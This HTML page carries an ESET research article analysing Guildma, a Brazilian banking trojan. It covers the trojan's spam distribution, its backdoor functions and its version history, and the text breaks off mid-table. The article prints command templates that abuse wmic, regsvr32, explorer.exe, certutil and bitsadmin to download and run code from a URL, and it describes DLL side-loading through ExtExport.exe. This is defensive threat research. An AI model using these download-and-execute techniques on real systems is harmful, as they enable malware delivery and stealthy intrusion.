<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/build/css/main-8633bd3c28.css" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'ESET Research',
        'ArticleCategory': 'Malware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });

    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>
<script>(function() {
  var _fbq = window._fbq || (window._fbq = []);
  if (!_fbq.loaded) {
    var fbds = document.createElement('script');
    fbds.async = true;
    fbds.src = '//connect.facebook.net/en_US/fbds.js';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(fbds, s);
    _fbq.loaded = true;
  }
  _fbq.push(['addPixelId', '1518099328403839']);
})();
window._fbq = window._fbq || [];
window._fbq.push(['track', 'PixelInitialized', {}]);
</script>
<noscript><img height="1" width="1" alt="" style="display:none" src="https://www.facebook.com/tr?id=1518099328403839&amp;ev=NoScript" /></noscript>
<meta property="fb:pages" content="56844830907" />
<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Guildma: The Devil drives electric | WeLiveSecurity</title>
<meta name="description" content="ESET researchers take a close look at Guildma, the most impactful and advanced banking trojan they’ve seen in Latin America. Guildma uses innovative methods of execution and sophisticated attack techniques to target mainly financial institutions in Brazil."/>
<link rel="canonical" href="https://www.welivesecurity.com/2020/03/05/guildma-devil-drives-electric/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="fr_FR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Guildma: The Devil drives electric | WeLiveSecurity" />
<meta property="og:description" content="ESET researchers take a close look at Guildma, the most impactful and advanced banking trojan they’ve seen in Latin America. Guildma uses innovative methods of execution and sophisticated attack techniques to target mainly financial institutions in Brazil." />
<meta property="og:url" content="https://www.welivesecurity.com/2020/03/05/guildma-devil-drives-electric/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Malware" />
<meta property="article:published_time" content="2020-03-05T10:30:07+00:00" />
<meta property="article:modified_time" content="2020-03-05T11:24:35+00:00" />
<meta property="og:updated_time" content="2020-03-05T11:24:35+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2020/03/guildma-malware-devil-drives-electric-e1582816901398.png" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2020/03/guildma-malware-devil-drives-electric-e1582816901398.png" />
<meta property="og:image:width" content="1000" />
<meta property="og:image:height" content="698" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="ESET researchers take a close look at Guildma, the most impactful and advanced banking trojan they’ve seen in Latin America. Guildma uses innovative methods of execution and sophisticated attack techniques to target mainly financial institutions in Brazil." />
<meta name="twitter:title" content="Guildma: The Devil drives electric | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2020/03/guildma-malware-devil-drives-electric-e1582816901398.png" />
<meta name="twitter:creator" content="@welivesecurity" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/fr/2020/03/06/guildma-cheval-de-troie-bancaire/" hreflang="fr" />
<link rel="alternate" href="https://www.welivesecurity.com/2020/03/05/guildma-devil-drives-electric/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2020/03/05/guildma-bankentrojaner-lateinamerika/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">
</head>
<body class="no-js single wide">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>
<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.3";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="col-xs-12 mobile-search-input">
                        <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                    </div>
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2020/03/06/guildma-cheval-de-troie-bancaire/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2020/03/05/guildma-bankentrojaner-lateinamerika/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="hidden-lg hidden-md hidden-sm hidden-xs col-xs-2 mobile-search imc">
                        <button class="imc">
                            <span class="icomoon icon-icon_search imc"></span>
                        </button>
                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/podcasts/">
                                            Podcasts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/2020/03/06/guildma-cheval-de-troie-bancaire/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2020/03/05/guildma-bankentrojaner-lateinamerika/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                                <div class="hidden-lg hidden-md col-xs-12 imc">
                                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc dark col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                                </div>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
                <div class="row hidden-sm hidden-xs">
                    <form action="https://www.welivesecurity.com/" class="basic-searchform imc  col-md-12 col-sm-10 col-xs-12" method="get" role="search">
	<div class="search-input clearfix">
		<input type="text" name="s" value="" placeholder="Search..." class="imc">
		<button class="imc">
			<span class="icomoon icon-icon_search imc"></span>
		</button>
	</div>
</form>	                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong> 
					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-wide" style="background-image: url('../../../../wp-content/uploads/2020/02/Guildma-e1581631162730.png'); background-position: 50% 50%;">
    <div class="text-wrapper">
        <div class="container promo-text">
            <div class="col-md-11 col-sm-11 col-xs-12 no-padding">
                <h1>Guildma: The Devil drives electric</h1>
<div class="excerpt">The fourth installment of our occasional series demystifying Latin American banking trojans</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2020/04/android-fullpage-1024x576-Copy-222x179.jpg" alt="ESET Research">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/esetresearch/" title="ESET Research">
                    ESET Research                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2020-03-05 11:30:07">5 Mar 2020 - 11:30AM</time>
		</span>
			</span>
</div>
            </div>
        </div>
    </div>
</div>

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F05%2Fguildma-devil-drives-electric%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F05%2Fguildma-devil-drives-electric%2F&text=Guildma: The Devil drives electric%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2020%2F03%2F05%2Fguildma-devil-drives-electric%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt wide">
                                <p>The fourth installment of our occasional series demystifying Latin American banking trojans</p>
                            </div>

                            <p>In this blogpost, we will examine Guildma (also known as Astaroth, a powerful demon), a highly prevalent Latin American banking trojan. This Brazil-targeting trojan, written in Delphi, boasts some innovative execution and attack techniques. We will describe the most recent version, highlighting the most notable changes made since the middle of 2019 when an avalanche of articles about Guildma was published in response to its largest campaign to date.</p>
<h2>Characteristics</h2>
<p>Guildma is a Latin American banking trojan that targets Brazil exclusively. Based on our telemetry — as well as the public attention it has received — we believe it to be the most impactful and advanced banking trojan in the region. Besides targeting financial institutions, Guildma also attempts to steal credentials for email accounts, e&#8209;shops and streaming services, and affects at least ten times as many victims as other Latin American banking trojans already described in this series. It uses innovative methods of execution and sophisticated attack techniques.</p>
<p>Unlike the Latin American banking trojans we have described previously, Guildma does not store the fake pop-up windows it uses within the binary. Instead, the attack is orchestrated by its C&amp;C server. This gives the authors greater flexibility to react to countermeasures implemented by the targeted banks.</p>
<p>Guildma implements the following backdoor functionalities:</p>
<ul>
<li>Taking screenshots</li>
<li>Capturing keystrokes</li>
<li>Emulating keyboard and mouse</li>
<li>Blocking shortcuts (such as disabling Alt + F4 to make it harder to get rid of fake windows it may display)</li>
<li>Downloading and executing files</li>
<li>Restarting the machine</li>
</ul>
<p>Guildma is very modular. At the time of writing, it consists of 10 modules, not including distribution chain stages. The functionality of individual modules will be discussed later.</p>
<h2>Evolution of distribution chains</h2>
<p>Our telemetry indicates Guildma spreads exclusively through spam emails with malicious attachments. Here are a few examples from a campaign from the middle of November 2019.</p>
<div id="attachment_135443" style="width: 660px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_01_Spam_1.png"><img class="wp-image-135443" src="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_01_Spam_1.png" alt="" width="650" height="264" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_01_Spam_1.png 670w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_01_Spam_1-300x122.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_01_Spam_1-340x137.png 340w" sizes="(max-width: 650px) 100vw, 650px" /></a><p class="wp-caption-text"><i>Figure 1. Spam email example (translation: &#8220;Hello, please explain these photos to me. I&#8217;m waiting for your explanation!&#8221;)</i></p></div>
<div id="attachment_135444" style="width: 660px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_02_Spam_2.png"><img class="wp-image-135444" src="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_02_Spam_2.png" alt="" width="650" height="276" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_02_Spam_2.png 652w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_02_Spam_2-300x127.png 300w" sizes="(max-width: 650px) 100vw, 650px" /></a><p class="wp-caption-text"><i>Figure 2. Spam email example (translation: &#8220;Dear member of <a href="https://thebrazilbusiness.com/article/consorcio-in-brazil" target="_blank" rel="noopener">consórcio</a>, attached is the proof of bid no. 75432.&#8221;)</i></p></div>
<div id="attachment_135445" style="width: 660px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_03_Spam_3.png"><img class="wp-image-135445" src="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_03_Spam_3.png" alt="" width="650" height="345" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_03_Spam_3.png 660w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_03_Spam_3-300x159.png 300w" sizes="(max-width: 650px) 100vw, 650px" /></a><p class="wp-caption-text"><i>Figure 3. Spam email example (translation: &#8220;Good morning, I am sending the proof of transfer &#8211; DOC. Citibank&#8221;)</i></p></div>
<div id="attachment_135446" style="width: 660px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_04_Spam_4.png"><img class="wp-image-135446" src="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_04_Spam_4-233x300.png" alt="" width="650" height="836" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_04_Spam_4-233x300.png 233w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_04_Spam_4.png 688w" sizes="(max-width: 650px) 100vw, 650px" /></a><p class="wp-caption-text"><i>Figure 4. Spam email example. Fake invoice reminder stating that a payment is due the day after tomorrow and that the payment may take up to 72 hours to be processed.</i></p></div>
<p>One of the defining characteristics of Guildma’s distribution chains is using tools already present on the system,<em> often in new and unusual ways.</em></p>
<p>Another characteristic is reusing techniques. New techniques are added every once in a while, but for the most part, the developers seem to simply reuse techniques from older versions.</p>
<div id="attachment_135447" style="width: 1034px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_05_Infection_chain.png"><img class="wp-image-135447 size-large" src="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_05_Infection_chain-1024x345.png" alt="" width="1024" height="345" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_05_Infection_chain-1024x345.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_05_Infection_chain-300x101.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_05_Infection_chain-768x259.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><p class="wp-caption-text"><i>Figure 5. Distribution chain of Guildma in version 150</i></p></div>
<p>Figure 5 shows the distribution chain for version 150, but the structure of Guildma’s distribution chains is very dynamic. For instance, in previous versions, the malicious LNK file shown in Figure 5 was not embedded in a ZIP archive, or an SFX RAR archive containing an MSI installer was used instead. Also, there used to be another JScript stage whose sole purpose was downloading and executing the final JScript stage; there have been too many changes overall to fit into this article. In fact, the only part that has mostly stayed the same is the final JScript stage.</p>
<p>Using data from our long-term, in-depth tracking of this family, we have compiled a very good picture of Guildma’s activity.</p>
<p>Figure 6 shows all ESET detections of Guildma’s first-stage component. As you can see, the campaigns were ramping up slowly until a massive campaign in August 2019, when we were seeing up to 50,000 samples per day. This campaign went on for almost two months and accounted for more than double the amount of detections we had seen in the 10 months prior.</p>
<div id="attachment_135448" style="width: 1034px" class="wp-caption aligncenter"><a href="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_06_Infection_statistics.png"><img class="wp-image-135448 size-large" src="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_06_Infection_statistics-1024x321.png" alt="" width="1024" height="321" srcset="https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_06_Infection_statistics-1024x321.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_06_Infection_statistics-300x94.png 300w, https://www.welivesecurity.com/wp-content/uploads/2020/02/Figure_06_Infection_statistics-768x241.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><p class="wp-caption-text"><i>Figure 6. First stage Guildma detections since October 2018</i></p></div>
<p>Following is a summary of some of the more interesting techniques used in the last 14 months.</p>
<h3>Execution of the JScript stage</h3>
<p>Over the last year, Guildma has used several methods of executing the JScript stages of its distribution chain. At the end of 2018, Guildma was hiding its code in <a href="https://attack.mitre.org/techniques/T1220/" target="_blank" rel="noopener">eXtensible Stylesheet Language (.xsl)</a> files and using <span style="font-family: courier new, courier, monospace;">wmic.exe</span> to download and execute them:</p>
<p><span style="font-family: courier new, courier, monospace;">wmic.exe &lt;wmic query&gt; /format:&#8221;&lt;URL&gt;&#8221;</span></p>
<p>It then briefly moved on to using <span style="font-family: courier new, courier, monospace;">regsvr32.exe</span> and <span style="font-family: courier new, courier, monospace;">scrobj.dll</span> to download a JScript-implemented COM object and execute its registration routine (which contained the malicious code):</p>
<p><span style="font-family: courier new, courier, monospace;">regsvr32.exe /s /n /u /i:&lt;URL&gt; scrobj.dll</span></p>
<p>Most recently, the authors started abusing Windows Explorer to execute the JScript stage. This attack relies on the fact that Windows Explorer will try to open any file passed to it on the command line with its associated program and the fact that the default association for<span style="font-family: courier new, courier, monospace;"> .js</span> files is the Microsoft Windows Script Host. The “script” passed to Windows Explorer is a single command whose purpose is to download and execute the actual JScript stage:</p>
<p><span style="font-family: courier new, courier, monospace;">echo GetObject(&#8216;script:&lt;URL&gt;&#8217;) &gt; &lt;file&gt;.js | explorer.exe &lt;random switches&gt; &lt;file&gt;.js</span></p>
<h3>Execution of the binary modules</h3>
<p>Methods of running the PE modules are no less diverse.</p>
<p>When we started tracking Guildma, it was abusing Avast’s <span style="font-family: courier new, courier, monospace;">aswRunDll.exe</span> to launch the first binary stage, with <span style="font-family: courier new, courier, monospace;">regsvr32.exe</span> as a failover for computers where Avast’s products weren’t installed. The use of <span style="font-family: courier new, courier, monospace;">aswRunDll.exe</span> was then dropped, leaving <span style="font-family: courier new, courier, monospace;">regsvr32.exe</span> as the sole method of execution. After a brief period of using <span style="font-family: courier new, courier, monospace;">rundll32.exe</span>, Guildma switched to its current execution method — <span style="font-family: courier new, courier, monospace;">ExtExport.exe</span>.</p>
<p><span style="font-family: courier new, courier, monospace;">ExtExport.exe</span> is an undocumented component of Microsoft Internet Explorer used for exporting bookmarks from Mozilla Firefox and 360 Secure Browser, and can be abused for DLL Side-Loading. When the following command is executed, <span style="font-family: courier new, courier, monospace;">mozcrt19.dll</span>, <span style="font-family: courier new, courier, monospace;">mozsqlite3.dll</span>, and <span style="font-family: courier new, courier, monospace;">sqlite3.dll</span> are loaded from the folder specified on the command line:</p>
<p><span style="font-family: courier new, courier, monospace;">C:\Program Files\Internet Explorer\ExtExport.exe &lt;folder&gt; &lt;dummy 1&gt; &lt;dummy 2&gt;</span></p>
<p>To abuse this, you would normally drop the DLL to be loaded as <em>one of</em> the above-mentioned files; Guildma uses <em>all three.</em></p>
<h3>Downloading the binary modules</h3>
<p>Guildma has also utilized a couple of different ways to download the binary modules. The first version was using <span style="font-family: courier new, courier, monospace;">certutil.exe</span> copied to <span style="font-family: courier new, courier, monospace;">certis.exe</span> (presumably to evade detection):</p>
<p><span style="font-family: courier new, courier, monospace;">certis.exe -urlcache -split -f &#8220;&lt;URL&gt;&#8221; &#8220;&lt;destination path&gt;&#8221;</span></p>
<p>The authors then switched to <span style="font-family: courier new, courier, monospace;">BITSAdmin</span> — the Microsoft Background Intelligent Transfer Service management tool — and are still using it at the time of writing:</p>
<p><span style="font-family: courier new, courier, monospace;">bitsadmin.exe /transfer &lt;random number&gt; /priority foreground &lt;URL&gt; &lt;destination&gt;</span></p>
<p>For a couple months, the binary modules were base64-encoded and hosted on Google Cloud. In that time, Guildma was using both <span style="font-family: courier new, courier, monospace;">BITSAdmin</span> and <span style="font-family: courier new, courier, monospace;">certutil</span> — <span style="font-family: courier new, courier, monospace;">BITSAdmin</span> to download the modules and <span style="font-family: courier new, courier, monospace;">certutil</span> to decode them.</p>
<h3>Other changes</h3>
<p>Guildma uses strange, non-descriptive variable and function names. When we started tracking Guildma, the names, while nonsensical, were clearly man-made (e.g. <em>“radador”</em> for the random number function or <em>“Bxaki”</em> for the download function). In June 2019 they were all changed to random-looking names (e.g. <em>“bx021”</em> and <em>“mrc430”</em>). At first, we thought the authors implemented some kind of an automated script obfuscator, but it turned out to be a onetime change and the names have remained the same since.</p>
<p>A relatively new addition is the age-old technique of using <a href="https://attack.mitre.org/techniques/T1096/" target="_blank" rel="noopener">ADS (Alternate Data Streams)</a> to store the binary modules. All the modules are now stored as ADS of a single file (e.g. <em>“desktop.ini:nauwuygiaa.jpg”</em>, <em>“desktop.ini:nauwuygiab.jpg”</em>, etc.).</p>
<h2>Version history</h2>
<p>Guildma has seemingly gone through many versions during its development, but there was usually very little development between versions — due to its clunky architecture utilizing hardcoded configuration values, for the most part the authors have to recompile all the binaries for every new campaign. A job that is clearly not completely automated, since there has often been a significant delay between updating the version number in the scripts and in the binaries.</p>
<p>In this article, we cover version 150, but since we started writing, two more versions have been released. They contain no substantial change in functionality or distribution, supporting our claims about Guildma’s development cycle.</p>
<p>The final stage of the distribution chain used to contain a version name (and even before that, it used to download said name along with the binary modules), but it has been (presumably) permanently replaced with a simple “xXx” since version 148.</p>
<p>Table 1 summarizes all the versions released since we started tracking Guildma actively in October 2018. Looking at the version strings, we get the feeling the author is passionate about ecology and fast cars.</p>
<p><em>Table 1. Guildma version history</em></p>

<table id="tablepress-799" class="tablepress tablepress-id-799">
<thead>
<tr class="row-1 odd">
	<th class="column-1">First seen</th><th class="column-2">Version number</th><th class="column-3">Version name</th><th class="column-4">Version prefix</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">2018-09-18</td><td class="column-2">131</td><td class="column-3">131_SUPER_Tesla</td><td class="column-4">marxvxinhhm</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">2018-10-31</td><td class="column-2">132</td><td class="column-3">132_ULTRA_Tesla</td><td class="column-4">srsysddirrx</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">2018-11-28</td><td class="column-2">133</td><td class="column-3">133_TORRE_DE_Tesla</td><td class="column-4">mxgetronicosxy</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">2018-11-29</td><td class="column-2">134</td><td class="column-3">134_MAXX_TESLAs</td><td class="column-4">dwqiopawsamazon</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">2018-12-03</td><td class="column-2">135</td><td class="column-3">135_MOAB_TESLAs</td><td class="column-4">lu769tsla</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">2018-12-13</td><td class="column-2">136</td><td class="column-3">136_KRAKEN_TESLAs</td><td class="column-4">lrdsnhrxxfery</td>
</tr>
<tr class="row-8 even">
	<td class="column-1">2019-02-06</td><td class="column-2">137</td><td class="column-3">137_RAPTOR_TESLAs</td><td class="column-4">rakpat0rpcack</td>
</tr>
<tr class="row-9 odd">
	<td class="column-1">2019-03-21</td><td class="column-2">138</td><td class="column-3">138_RAPTOR_TESLAs_</td><td class="column-4">hillwd763free</td>
</tr>
<tr class="row-10 even">
	<td class="column-1">2019-05-20</td><td class="column-2">139</td><td class="column-3">139_TESLA_</td><td class="column-4">falxconxrenw</td>
</tr>
<tr class="row-11 odd">
